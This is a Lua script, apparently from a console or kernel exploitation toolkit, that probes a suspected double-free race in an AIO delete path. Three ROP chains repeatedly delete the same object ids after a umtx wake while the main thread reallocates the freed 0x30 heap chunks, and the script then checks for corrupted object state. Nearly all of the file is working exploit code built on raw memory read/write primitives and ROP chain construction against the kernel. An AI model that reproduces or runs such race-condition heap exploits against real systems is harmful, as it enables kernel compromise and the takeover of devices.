-- CRASH_CLASS: HIGH
-- PROBE 664a: sustained storm on the aio delete free window. Three chains
-- delete the same eight ids 2000 times each after one umtx wake, while the
-- parent creates and deletes its own objects to reuse the freed 0x30 chunks.
-- A double free shows up as a shared context: a later poll or delete of an
-- object we still hold must then report something other than 3 / 0.
print("=== PROBE 664a: AIO DELETE STORM WITH CHUNK REUSE ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local IDS=8
local data=memory.alloc(0x200)
local out=memory.alloc(8)
local function create1()
  local r=N(select(2,pcall(function() return mk(669)(U(1),U(N(data)),U(0x28),U(1),U(N(out)),U(0)) end)))
  return r, rd(N(out)) or 0
end
local ids={}
local base=0
local r0,b0=create1(); base=b0
print(string.format("[A] probe create rv=%s base=%X",tostring(r0),base))
if r0~=0 then return end
for i=0,IDS-1 do ids[i]=base+i*0x10000 end
-- create each id separately (single-item objects)
local live={}
for i=0,IDS-1 do
  local r,b=create1()
  live[i]={id=b,st=memory.alloc(8)}
end
local function poll(id,st) return N(select(2,pcall(function() return mk(664)(U(N(st)),U(1),U(0),U(0),U(0),U(0)) end))) end
local function pollid(id)
  local p=memory.alloc(8); wd(N(p),id)
  local r=N(select(2,pcall(function() return mk(664)(U(N(p)),U(1),U(0),U(0),U(0),U(0)) end)))
  local s=memory.alloc(8); wd(N(s),0)
  pcall(function() mk(664)(U(N(p)),U(1),U(N(s)),U(0),U(0),U(0)) end)
  return N(r), rd(N(s)) or 0
end
local okc=0
for i=0,IDS-1 do
  local r,s=pollid(live[i].id)
  if s==3 then okc=okc+1 end
end
print(string.format("[B] created %d objects, polled-3=%d",IDS,okc))
-- barrier word
local W=memory.alloc(8); wd(N(W),0)
local function chain_for(k)
  local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x80000})
  c:push_syscall_with_ret(mk(454),U(N(W)),U(2),U(0))
  for n=1,2000 do
    local i=(n+k)%IDS
    local idp=memory.alloc(8); wd(N(idp),live[i].id)
    local stp=memory.alloc(8); wd(N(stp),0)
    c:push_syscall(mk(662),U(N(idp)),U(1),U(N(stp)))
  end
  return c
end
print("[C] building chains")
local chains={}
for k=1,3 do chains[k]=chain_for(k) end
print("[D] chains built, starting")
local threads={}
for k=1,3 do threads[k]=thread:new(chains[k]); threads[k]:run(true) end
for i=1,150000 do local x=i end
wd(N(W),1)
local wok=N(select(2,pcall(function() return mk(454)(U(N(W)),U(3),U(0x7fffffff),U(0),U(0),U(0)) end)))
print(string.format("[E] wake rv=%s",tostring(wok)))
-- parent reuses chunks while the chains run
local made,del=0,0
for n=1,1200 do
  local r,b=create1()
  if r==0 then
    made=made+1
    local p=memory.alloc(8); wd(N(p),b)
    mk(664)(U(N(p)),U(1),U(0),U(0),U(0),U(0))
    local s=memory.alloc(8); wd(N(s),0)
    mk(662)(U(N(p)),U(1),U(N(s)),U(0),U(0),U(0))
    if rd(N(s))==0 then del=del+1 end
  end
end
print(string.format("[F] parent create=%d delete-ok=%d",made,del))
for k=1,3 do pcall(function() threads[k]:join() end) end
print("[G] chains joined")
local bad=0
for i=0,IDS-1 do
  local r,s=pollid(live[i].id)
  if s~=3 and s~=0x80020003 then bad=bad+1; print(string.format("[H] id%d poll state=%X",i,s)) end
end
print(string.format("[I] held-object anomalies=%d",bad))
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
